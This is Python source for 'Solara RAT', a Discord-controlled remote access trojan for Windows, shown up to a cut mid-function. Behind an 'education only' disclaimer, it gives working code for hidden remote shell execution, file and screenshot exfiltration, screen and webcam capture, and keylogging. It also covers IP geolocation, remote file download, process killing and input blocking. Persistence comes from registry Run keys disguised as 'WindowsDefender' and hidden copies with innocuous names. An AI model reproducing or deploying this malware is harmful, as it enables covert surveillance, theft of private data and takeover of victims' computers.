
"""
-------------------------------------------------------------------------------
 Solara RAT - Created by xsolara
-------------------------------------------------------------------------------

 This project was made for learning, research, and ethical security development.
 I strongly believe in understanding technology to improve security, not to harm it.
 Solara RAT is NOT meant for malicious use. It is a tool for education only.

 If you use this software for anything illegal, that is on you. I do not take 
 responsibility for misuse. Be ethical, respect privacy, and follow the law.

 By using this tool, you agree to use it ethically and in accordance with all applicable laws.

 Knowledge should be used to build, not destroy.
-------------------------------------------------------------------------------
"""




import discord
import subprocess
import os
import platform
import socket
import getpass
from discord.ext import commands
import asyncio
import requests  
import psutil
import time
from datetime import datetime
import winreg
import shutil
import ctypes
from urllib.parse import urlparse
from pynput import keyboard
import threading
import queue
import base64
import sys
import pyautogui  
import sounddevice as sd  
import wave
import numpy as np
import win32gui
import win32con
import win32api
import win32process
import wmi
import ctypes.wintypes
import pyttsx3
from PIL import Image
from io import BytesIO
from ctypes import windll, Structure, c_long, byref, POINTER, c_char, wintypes
import random
import math
import winsound
import pygame.display
import pygame.font
import pygame.draw
import pygame.mixer
import screen_brightness_control
import win32security
import win32com
import sqlite3
import win32crypt
import json
import re
from Crypto.Cipher import AES
import webbrowser
import zipfile
import aiofiles

try:
    from config import *
except ImportError:

    TOKEN = os.getenv('BOT_TOKEN')
    OWNER_ID = int(os.getenv('OWNER_ID'))
    COMMAND_PREFIX = '!'
    SOLARA_PURPLE = 0x9B4BDD
    SOLARA_PINK = 0xFF69B4
    SOLARA_BLUE = 0x4B9BDD
    SOLARA_ERROR = 0xFF355E
    BOT_NAME = "Solara"

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

_c = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)

key_queue = queue.Queue()
is_logging = False
log_thread = None
is_recording = False

class POINT(Structure):
    _fields_ = [("x", c_long), ("y", c_long)]

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def set_window_fullscreen_focus(pygame_window):
    """Make pygame window fullscreen and focused"""
    try:
        hwnd = pygame.display.get_wm_info()['window']
        win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
        win32gui.SetForegroundWindow(hwnd)
        win32gui.SetWindowPos(
            hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
            win32con.SWP_NOMOVE | win32con.SWP_NOSIZE
        )
    except:
        pass

def get_system_info():
    try:
        hostname = socket.gethostname()

        try:
            public_ip = requests.get('https://api.ipify.org').text
        except:
            public_ip = "Unable to fetch"

        local_ips = []
        for interface in socket.getaddrinfo(hostname, None):
            if interface[4][0] not in local_ips and not interface[4][0].startswith('127.'):
                local_ips.append(interface[4][0])

        info = {
            "🔑 Session ID": os.urandom(4).hex(),
            "💻 System": hostname,
            "🌐 Public IP": public_ip,
            "📡 Local IPs": ', '.join(local_ips),
            "🖥️ OS": f"{platform.system()} {platform.release()}",
            "⚡ Architecture": platform.machine(),
            "👤 User": getpass.getuser(),
            "📂 Location": os.getcwd(),
            "🔄 Process": os.getpid()
        }
        return info
    except:
        return {"❌ Error": "Failed to collect system info"}

@_c.event
async def on_ready():
    try:
        print(f'✨ {BOT_NAME} initialized ✨')
        owner = await _c.fetch_user(OWNER_ID)
        if owner:
            info = get_system_info()
            embed = discord.Embed(
                title=f"🌟 {BOT_NAME} Connected",
                description=f"New system successfully linked to {BOT_NAME} network",
                color=SOLARA_PURPLE,
                timestamp=discord.utils.utcnow()
            )

            for k, v in info.items():
                embed.add_field(name=k, value=v, inline=True)

            embed.set_footer(text=f"✨ {BOT_NAME} Remote Access ✨")
            await owner.send(embed=embed)
    except:
        pass

@_c.command(name='shell', aliases=['cmd', 'run'])
async def execute_command(ctx, *, cmd):
    if ctx.author.id != OWNER_ID:
        return

    try:
        await ctx.message.delete()

        embed = discord.Embed(
            title="⚡ Solara Command Center",
            description=f"```py\n{cmd}\n```",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        embed.set_author(name="Executing command...")

        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        stdout, stderr = process.communicate(timeout=60)

        if stdout:
            chunks = [stdout[i:i+1000] for i in range(0, len(stdout), 1000)]
            for i, chunk in enumerate(chunks):
                if i == 0:
                    embed.add_field(name="📤 Output", value=f"```\n{chunk}\n```", inline=False)
                else:
                    embed.add_field(name="📤 Continued...", value=f"```\n{chunk}\n```", inline=False)

        if stderr:
            embed.add_field(name="⚠️ Error", value=f"```\n{stderr[:1000]}\n```", inline=False)
            embed.color = SOLARA_ERROR

        if not stdout and not stderr:
            embed.add_field(name="✨ Result", value="Command executed successfully", inline=False)

        embed.set_footer(text=f"Exit Code: {process.returncode} | Solara Remote Access")
        await ctx.send(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Command Failed",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='files', aliases=['dir', 'ls'])
async def file_ops(ctx, operation="list", *, path="."):
    if ctx.author.id != OWNER_ID:
        return

    try:
        if operation in ["list", "ls"]:
            files = os.listdir(path)
            abs_path = os.path.abspath(path)

            embed = discord.Embed(
                title="✨ Solara File Explorer",
                description=f"📂 **Current Location:**\n`{abs_path}`",
                color=SOLARA_PINK,
                timestamp=discord.utils.utcnow()
            )

            folders = [f for f in files if os.path.isdir(os.path.join(path, f))]
            files = [f for f in files if os.path.isfile(os.path.join(path, f))]

            if folders:
                folder_list = "\n".join(f"📁 {f}" for f in sorted(folders))
                embed.add_field(name=f"Folders ({len(folders)})", value=f"```\n{folder_list}\n```", inline=False)

            if files:
                file_list = "\n".join(f"📄 {f}" for f in sorted(files))
                embed.add_field(name=f"Files ({len(files)})", value=f"```\n{file_list}\n```", inline=False)

            embed.set_footer(text="✨ Solara Remote Access ✨")
            await ctx.send(embed=embed)

        elif operation in ["upload", "ul", "get"]:
            if not os.path.exists(path):
                raise FileNotFoundError(f"❌ File not found: {path}")

            file_size = os.path.getsize(path)
            if file_size < 7_340_032:
                embed = discord.Embed(
                    title="📤 Solara File Transfer",
                    description=f"**Uploading:** `{path}`\n**Size:** {file_size/1024/1024:.2f} MB",
                    color=SOLARA_PURPLE
                )
                msg = await ctx.send(embed=embed)
                await ctx.send(file=discord.File(path))
                await msg.delete()
            else:
                embed = discord.Embed(
                    title="📤 Solara Large File Transfer",
                    description=f"**Splitting file:** `{path}`\n**Size:** {file_size/1024/1024:.2f} MB",
                    color=SOLARA_BLUE
                )
                await ctx.send(embed=embed)

                chunk_size = 7_340_032
                with open(path, 'rb') as f:
                    chunk_num = 1
                    while True:
                        chunk = f.read(chunk_size)
                        if not chunk:
                            break
                        temp_path = f'chunk_{chunk_num}.tmp'
                        with open(temp_path, 'wb') as tmp:
                            tmp.write(chunk)
                        await ctx.send(f'✨ Part {chunk_num}:', file=discord.File(temp_path))
                        os.remove(temp_path)
                        chunk_num += 1

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Explorer Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='info', aliases=['system'])
async def system_info(ctx):
    if ctx.author.id != OWNER_ID:
        return

    try:
        info = get_system_info()
        embed = discord.Embed(
            title="✨ Solara System Information",
            color=SOLARA_PURPLE,
            timestamp=discord.utils.utcnow()
        )

        for k, v in info.items():
            embed.add_field(name=k, value=v, inline=True)

        embed.set_footer(text="✨ Solara Remote Access ✨")
        await ctx.send(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Info Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='screenshot', aliases=['screen', 'sc'])
async def take_screenshot(ctx):
    if ctx.author.id != OWNER_ID:
        return

    try:
        import PIL.ImageGrab

        embed = discord.Embed(
            title="📸 Solara Screen Capture",
            description="Capturing screen...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        screenshot = PIL.ImageGrab.grab()
        temp_path = "solara_screen.png"
        screenshot.save(temp_path)

        await ctx.send(file=discord.File(temp_path))
        os.remove(temp_path)
        await msg.delete()

    except ImportError:
        await ctx.send(embed=discord.Embed(
            title="❌ Module Error",
            description="Screenshot module not installed. Install with: `pip install pillow`",
            color=SOLARA_ERROR
        ))
    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Screenshot Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

@_c.command(name='screenrec', aliases=['record', 'rec'])
async def screen_record(ctx, duration: int = 15):
    """Record screen for specified duration (default 15 seconds)"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        import cv2
        import numpy as np
        from PIL import ImageGrab

        duration = min(max(1, duration), 30)

        embed = discord.Embed(
            title="🎥 Screen Recording",
            description=f"Recording screen for {duration} seconds...",
            color=SOLARA_BLUE
        )
        msg = await ctx.send(embed=embed)

        temp_path = "screen_recording.mp4"
        screen = ImageGrab.grab()
        height, width = screen.size[1], screen.size[0]
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(temp_path, fourcc, 20.0, (width, height))

        start_time = time.time()
        while time.time() - start_time < duration:

            frame = ImageGrab.grab()
            frame = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)
            out.write(frame)

        out.release()
        cv2.destroyAllWindows()

        await ctx.send("📤 Uploading recording...")
        await ctx.send(file=discord.File(temp_path))
        os.remove(temp_path)
        await msg.delete()

    except ImportError:
        await ctx.send("Required modules: opencv-python, numpy, pillow")
    except Exception as e:
        await ctx.send(f"Recording error: {str(e)}")

@_c.command(name='download', aliases=['dl'])
async def download_local(ctx, path):
    """Download a file from the target system"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if not os.path.exists(path):
            raise FileNotFoundError(f"File not found: {path}")

        file_size = os.path.getsize(path)

        embed = discord.Embed(
            title="📥 Solara File Download",
            description=f"Downloading: `{path}`\nSize: {file_size/1024/1024:.2f} MB",
            color=SOLARA_BLUE
        )
        msg = await ctx.send(embed=embed)

        if file_size < 7_340_032:  
            await ctx.send(file=discord.File(path))
            await msg.delete()
        else:

            chunk_size = 7_340_032
            with open(path, 'rb') as f:
                chunk_num = 1
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    temp_path = f'chunk_{chunk_num}.tmp'
                    with open(temp_path, 'wb') as tmp:
                        tmp.write(chunk)
                    await ctx.send(f'Part {chunk_num}:', file=discord.File(temp_path))
                    os.remove(temp_path)
                    chunk_num += 1

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Download Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

@_c.command(name='install')
async def install_file(ctx, url, filename=None):
    """Download a file from URL to target system"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if not filename:
            filename = os.path.basename(urlparse(url).path)
            if not filename:
                filename = 'downloaded_file'

        embed = discord.Embed(
            title="📥 Solara File Installation",
            description=f"Downloading from: `{url}`\nTo: `{filename}`",
            color=SOLARA_BLUE
        )
        msg = await ctx.send(embed=embed)

        response = requests.get(url, stream=True)
        total_size = int(response.headers.get('content-length', 0))

        with open(filename, 'wb') as f:
            if total_size == 0:
                f.write(response.content)
            else:
                dl = 0
                for data in response.iter_content(chunk_size=4096):
                    dl += len(data)
                    f.write(data)

        success_embed = discord.Embed(
            title="✅ Installation Complete",
            description=f"Saved as: `{filename}`\nSize: {os.path.getsize(filename)/1024/1024:.2f} MB",
            color=SOLARA_PURPLE
        )
        await msg.edit(embed=success_embed)

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Installation Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

@_c.command(name='processes', aliases=['ps'])
async def list_processes(ctx):
    if ctx.author.id != OWNER_ID:
        return

    try:
        embed = discord.Embed(
            title="🔄 Solara Process Monitor",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )

        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                pinfo = proc.info
                processes.append((
                    pinfo['pid'],
                    pinfo['name'],
                    pinfo['cpu_percent'],
                    pinfo['memory_percent']
                ))
            except:
                continue

        processes.sort(key=lambda x: x[2], reverse=True)

        process_list = ""
        for pid, name, cpu, mem in processes[:15]:
            process_list += f"{name[:20]:<20} (PID: {pid}) CPU: {cpu:.1f}% MEM: {mem:.1f}%\n"

        embed.add_field(
            name="Top Processes",
            value=f"```\n{process_list}\n```",
            inline=False
        )

        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Process Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

@_c.command(name='kill')
async def kill_process(ctx, pid: int):
    if ctx.author.id != OWNER_ID:
        return

    try:
        process = psutil.Process(pid)
        process_name = process.name()
        process.terminate()

        embed = discord.Embed(
            title="⚡ Process Terminated",
            description=f"Successfully terminated process:\n`{process_name} (PID: {pid})`",
            color=SOLARA_PURPLE,
            timestamp=discord.utils.utcnow()
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Termination Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

BLACKLISTED_PROCESSES = set()

@_c.command(name='blacklist')
async def blacklist_process(ctx, process_name: str):
    """Add a process to the blacklist to prevent it from running"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        embed = discord.Embed(
            title="🚫 Process Blacklist",
            description=f"Adding process `{process_name}` to blacklist...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        BLACKLISTED_PROCESSES.add(process_name.lower())
        terminated_count = 0

        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() == process_name.lower():
                    psutil.Process(proc.info['pid']).terminate()
                    terminated_count += 1
            except:
                continue

        if not hasattr(blacklist_process, 'monitor_thread'):
            blacklist_process.monitor_thread = threading.Thread(target=monitor_blacklisted_processes)
            blacklist_process.monitor_thread.daemon = True
            blacklist_process.monitor_thread.start()

        embed.title = "✅ Process Blacklisted"
        embed.color = SOLARA_PURPLE
        embed.description = f"Process `{process_name}` has been added to blacklist"

        embed.add_field(
            name="🔄 Status",
            value=f"Terminated {terminated_count} running instances",
            inline=False
        )

        embed.add_field(
            name="👁️ Monitoring",
            value="Active - Process will be prevented from running",
            inline=False
        )

        embed.add_field(
            name="📝 Blacklist Size",
            value=f"Total blacklisted processes: {len(BLACKLISTED_PROCESSES)}",
            inline=False
        )

        await msg.edit(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Blacklist Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='whitelist')
async def whitelist_process(ctx, process_name: str):
    """Remove a process from the blacklist"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        embed = discord.Embed(
            title="⚪ Process Whitelist",
            description=f"Checking blacklist status for `{process_name}`...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        if process_name.lower() in BLACKLISTED_PROCESSES:
            BLACKLISTED_PROCESSES.remove(process_name.lower())
            embed.title = "✅ Process Whitelisted"
            embed.description = f"Process `{process_name}` has been removed from blacklist"
            embed.color = SOLARA_PURPLE

            embed.add_field(
                name="👁️ Monitoring",
                value="Disabled - Process can now run normally",
                inline=False
            )
        else:
            embed.title = "ℹ️ Not Blacklisted"
            embed.description = f"Process `{process_name}` was not in the blacklist"
            embed.color = SOLARA_BLUE

        embed.add_field(
            name="📝 Blacklist Size",
            value=f"Total blacklisted processes: {len(BLACKLISTED_PROCESSES)}",
            inline=False
        )

        if BLACKLISTED_PROCESSES:
            embed.add_field(
                name="🔒 Active Blacklist",
                value="\n".join(f"• {p}" for p in sorted(BLACKLISTED_PROCESSES)),
                inline=False
            )

        await msg.edit(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Whitelist Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

@_c.command(name='blacklist-status')
async def blacklist_status(ctx):
    """Show current blacklist status"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        embed = discord.Embed(
            title="📊 Process Blacklist Status",
            description="Gathering blacklist information...",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )
        msg = await ctx.send(embed=embed)

        active_blocked = 0
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in BLACKLISTED_PROCESSES:
                    active_blocked += 1
            except:
                continue

        embed.description = "Current blacklist status and statistics"
        embed.color = SOLARA_PURPLE

        embed.add_field(
            name="📝 Blacklist Size",
            value=f"Total blacklisted processes: {len(BLACKLISTED_PROCESSES)}",
            inline=False
        )

        if BLACKLISTED_PROCESSES:
            embed.add_field(
                name="🔒 Blacklisted Processes",
                value="\n".join(f"• {p}" for p in sorted(BLACKLISTED_PROCESSES)),
                inline=False
            )

        embed.add_field(
            name="🔄 Active Blocks",
            value=f"Currently blocking {active_blocked} process(es)",
            inline=False
        )

        embed.add_field(
            name="👁️ Monitor Status",
            value="Active" if hasattr(blacklist_process, 'monitor_thread') and blacklist_process.monitor_thread.is_alive() else "Inactive",
            inline=False
        )

        await msg.edit(embed=embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Status Error",
            description=str(e),
            color=SOLARA_ERROR
        )
        await ctx.send(embed=error_embed)

def monitor_blacklisted_processes():
    """Background thread to monitor and terminate blacklisted processes"""
    while True:
        try:
            terminated_count = 0
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'].lower() in BLACKLISTED_PROCESSES:
                        psutil.Process(proc.info['pid']).terminate()
                        terminated_count += 1
                except:
                    continue
            time.sleep(1)  
        except:
            continue

input_blocked = False

@_c.command(name='block-input')
async def block_input(ctx):
    """Block keyboard and mouse input"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        global input_blocked
        if input_blocked:
            await ctx.send("Input is already blocked!")
            return

        input_blocked = True

        def block_thread():
            try:

                hwnd = win32gui.CreateWindowEx(
                    win32con.WS_EX_TOPMOST | win32con.WS_EX_TOOLWINDOW,
                    "Static",
                    None,
                    win32con.WS_POPUP | win32con.WS_VISIBLE,
                    0, 0, win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1),
                    0, 0, win32gui.GetModuleHandle(None), None
                )

                win32gui.SetLayeredWindowAttributes(hwnd, 0, 1, win32con.LWA_ALPHA)

                while input_blocked:
                    win32gui.SetForegroundWindow(hwnd)
                    time.sleep(0.1)

                win32gui.DestroyWindow(hwnd)

            except Exception as e:
                print(f"Block thread error: {str(e)}")

        thread = threading.Thread(target=block_thread)
        thread.daemon = True
        thread.start()

        embed = discord.Embed(
            title="🔒 Input Blocked",
            description="Keyboard and mouse input has been blocked",
            color=SOLARA_PURPLE
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Block input error: {str(e)}")

@_c.command(name='unblock-input')
async def unblock_input(ctx):
    """Unblock keyboard and mouse input"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        global input_blocked
        if not input_blocked:
            await ctx.send("Input is not blocked!")
            return

        input_blocked = False

        embed = discord.Embed(
            title="🔓 Input Unblocked",
            description="Keyboard and mouse input has been restored",
            color=SOLARA_PURPLE
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Unblock input error: {str(e)}")

@_c.command(name='startup')
async def add_to_startup(ctx):
    if ctx.author.id != OWNER_ID:
        return

    try:
        import winreg

        script_path = os.path.abspath(__file__)
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Solara", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
        winreg.CloseKey(key)

        embed = discord.Embed(
            title="✨ Startup Configuration",
            description="Successfully added Solara to startup programs",
            color=SOLARA_PURPLE,
            timestamp=discord.utils.utcnow()
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Startup Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

@_c.command(name='status')
async def system_status(ctx):
    if ctx.author.id != OWNER_ID:
        return

    try:
        embed = discord.Embed(
            title="📊 Solara System Status",
            color=SOLARA_BLUE,
            timestamp=discord.utils.utcnow()
        )

        cpu_percent = psutil.cpu_percent(interval=1)
        cpu_freq = psutil.cpu_freq()
        embed.add_field(
            name="🔄 CPU",
            value=f"Usage: {cpu_percent}%\nFrequency: {cpu_freq.current:.0f}MHz",
            inline=True
        )

        mem = psutil.virtual_memory()
        embed.add_field(
            name="💾 Memory",
            value=f"Used: {mem.percent}%\nAvailable: {mem.available/1024/1024/1024:.1f}GB",
            inline=True
        )

        disk = psutil.disk_usage('/')
        embed.add_field(
            name="💿 Disk",
            value=f"Used: {disk.percent}%\nFree: {disk.free/1024/1024/1024:.1f}GB",
            inline=True
        )

        net = psutil.net_io_counters()
        embed.add_field(
            name="🌐 Network",
            value=f"Sent: {net.bytes_sent/1024/1024:.1f}MB\nReceived: {net.bytes_recv/1024/1024:.1f}MB",
            inline=True
        )

        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        embed.add_field(
            name="⏰ Uptime",
            value=f"{uptime.days} days, {uptime.seconds//3600} hours",
            inline=True
        )

        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Status Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

@_c.command(name='persist')
async def add_persistence(ctx):
    """More sophisticated persistence with multiple methods"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        script_path = os.path.abspath(__file__)
        appdata = os.getenv('APPDATA')
        startup_path = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        system32_path = os.path.join(os.getenv('SYSTEMROOT'), "System32", "drivers", "etc")

        hidden_names = [
            ("winsys32.pyw", appdata),
            ("mscore.pyw", startup_path),
            ("netdrv.pyw", system32_path)
        ]

        success_msg = []

        for name, path in hidden_names:
            try:
                dest = os.path.join(path, name)
                shutil.copy2(script_path, dest)

                ctypes.windll.kernel32.SetFileAttributesW(dest, 2)
                success_msg.append(f"✓ {name}")
            except:
                continue

        reg_entries = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")
        ]

        for reg_root, reg_path in reg_entries:
            try:
                key = winreg.OpenKey(reg_root, reg_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "WindowsDefender", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
                winreg.CloseKey(key)
                success_msg.append(f"✓ Registry entry added")
            except:
                continue

        embed = discord.Embed(
            title="🛡️ System Integration",
            description="Service integration completed\n" + "\n".join(success_msg),
            color=SOLARA_PURPLE
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send("×")

def on_key_press(key):
    """Callback for keylogger"""
    global is_logging
    if is_logging:
        try:
            key_queue.put(str(key))
        except:
            pass

def keylogger_thread():
    """Background thread for keylogger"""
    global is_logging
    with keyboard.Listener(on_press=on_key_press) as listener:
        while is_logging:
            listener.join(timeout=1.0)

@_c.command(name='keylog', aliases=['kl'])
async def keylogger(ctx, action: str = None):
    """Manage keylogger"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if action is None:
            embed = discord.Embed(
                title="⌨️ Keylog Command Help",
                description="Controls the keyboard monitoring system",
                color=SOLARA_BLUE
            )
            embed.add_field(
                name="Usage",
                value="!keylog <action>",
                inline=False
            )
            embed.add_field(
                name="Actions",
                value="• start - Begin logging\n• stop - Stop and save log\n• status - Check if active",
                inline=False
            )
            embed.add_field(
                name="Example",
                value="!keylog start",
                inline=False
            )
            await ctx.send(embed=embed)
            return

        if action not in ['start', 'stop', 'status']:
            await ctx.send("❌ Invalid action! Options: start, stop, status")
            return

        global is_logging, log_thread

        try:
            if action == 'start':
                if not is_logging:
                    is_logging = True
                    log_thread = threading.Thread(target=keylogger_thread)
                    log_thread.daemon = True
                    log_thread.start()

                    embed = discord.Embed(
                        title="⌨️ Input Monitor",
                        description="Monitoring started",
                        color=SOLARA_BLUE
                    )
                    await ctx.send(embed=embed)

            elif action == 'stop':
                if is_logging:
                    is_logging = False
                    if log_thread:
                        log_thread.join(timeout=1.0)

                    keys = []
                    while not key_queue.empty():
                        keys.append(key_queue.get())

                    if keys:
                        log_text = ' '.join(keys)

                        with open("keylog.txt", "w") as f:
                            f.write(f"Solara Keylog - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                            f.write("-" * 50 + "\n")
                            f.write(log_text)

                        embed = discord.Embed(
                            title="⌨️ Input Log",
                            description="Keylog file attached below",
                            color=SOLARA_PURPLE
                        )
                        await ctx.send(embed=embed)
                        await ctx.send(file=discord.File("keylog.txt"))

                        os.remove("keylog.txt")
                    else:
                        embed = discord.Embed(
                            title="⌨️ Input Monitor",
                            description="No keystrokes recorded",
                            color=SOLARA_PURPLE
                        )
                        await ctx.send(embed=embed)

            elif action == 'status':
                embed = discord.Embed(
                    title="⌨️ Input Monitor Status",
                    description=f"Currently {'active' if is_logging else 'inactive'}",
                    color=SOLARA_BLUE if is_logging else SOLARA_PURPLE
                )
                await ctx.send(embed=embed)

        except Exception as e:
            await ctx.send("×")

    except Exception as e:
        await ctx.send("×")

@_c.command(name='browse')
async def browse_files(ctx, path="."):
    if ctx.author.id != OWNER_ID:
        return

    try:
        abs_path = os.path.abspath(path)
        items = os.listdir(path)

        embed = discord.Embed(
            title="📂 File Browser",
            description=f"Location: `{abs_path}`",
            color=SOLARA_BLUE
        )

        folders = []
        files = []

        for item in items:
            full_path = os.path.join(path, item)
            try:
                stats = os.stat(full_path)
                size = stats.st_size
                modified = datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M')

                if os.path.isdir(full_path):
                    folders.append(f"📁 `{item}/`\n└─ Modified: {modified}")
                else:
                    size_str = f"{size/1024/1024:.1f}MB" if size > 1024*1024 else f"{size/1024:.1f}KB"
                    files.append(f"📄 `{item}`\n└─ Size: {size_str} | Modified: {modified}")
            except:
                continue

        if folders:
            embed.add_field(name="📁 Folders", value="\n".join(folders[:10]), inline=False)
        if files:
            embed.add_field(name="📄 Files", value="\n".join(files[:10]), inline=False)

        if len(folders) + len(files) > 20:
            embed.set_footer(text=f"Showing 20/{len(folders) + len(files)} items")

        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Browser Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

@_c.command(name='webcam')
async def webcam_capture(ctx):
    if ctx.author.id != OWNER_ID:
        return

    try:
        import cv2

        embed = discord.Embed(
            title="📸 Camera Capture",
            description="Accessing camera...",
            color=SOLARA_BLUE
        )
        msg = await ctx.send(embed=embed)

        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()

        if ret:
            cv2.imwrite("solara_cam.png", frame)
            await ctx.send(file=discord.File("solara_cam.png"))
            os.remove("solara_cam.png")
            await msg.delete()
        else:
            raise Exception("Failed to capture image")

    except ImportError:
        await ctx.send("Module 'cv2' required")
    except Exception as e:
        await ctx.send(f"×")

@_c.command(name='locate')
async def get_location(ctx):
    if ctx.author.id != OWNER_ID:
        return

    try:
        ip_data = requests.get('http://ip-api.com/json/').json()

        if ip_data['status'] == 'success':
            embed = discord.Embed(
                title="📍 Location Data",
                color=SOLARA_PURPLE
            )

            fields = {
                "📍 City": ip_data.get('city', 'Unknown'),
                "🏢 Region": ip_data.get('regionName', 'Unknown'),
                "🌍 Country": ip_data.get('country', 'Unknown'),
                "🌐 ISP": ip_data.get('isp', 'Unknown'),
                "⭐ Timezone": ip_data.get('timezone', 'Unknown'),
                "📌 Coordinates": f"{ip_data.get('lat', '?')}, {ip_data.get('lon', '?')}"
            }

            for name, value in fields.items():
                embed.add_field(name=name, value=value, inline=True)

            await ctx.send(embed=embed)
        else:
            raise Exception("Failed to fetch location data")

    except Exception as e:
        await ctx.send("×")

@_c.command(name='services')
async def manage_services(ctx, action='list', service_name=None):
    """Manage Windows services"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        wmi_obj = wmi.WMI()

        if action == 'list':
            services = wmi_obj.Win32_Service()

            embed = discord.Embed(
                title="🔧 Windows Services",
                color=SOLARA_BLUE
            )

            running_services = [s.Name for s in services if s.State == 'Running']
            stopped_services = [s.Name for s in services if s.State == 'Stopped']

            embed.add_field(
                name="🟢 Running",
                value=f"```\n{', '.join(running_services[:20])}\n```",
                inline=False
            )
            embed.add_field(
                name="🔴 Stopped",
                value=f"```\n{', '.join(stopped_services[:20])}\n```",
                inline=False
            )

            await ctx.send(embed=embed)

        elif action in ['stop', 'start', 'restart'] and service_name:
            service = wmi_obj.Win32_Service(Name=service_name)[0]

            if action == 'stop':
                service.StopService()
            elif action == 'start':
                service.StartService()
            elif action == 'restart':
                service.StopService()
                time.sleep(1)
                service.StartService()

            await ctx.send(f"✅ Service {service_name} {action}ed")

    except Exception as e:
        await ctx.send(f"Service error: {str(e)}")

@_c.command(name='windows')
async def window_control(ctx, action='list'):
    """Control windows on target system"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if action == 'list':
            windows = []
            def enum_windows(hwnd, results):
                if win32gui.IsWindowVisible(hwnd):
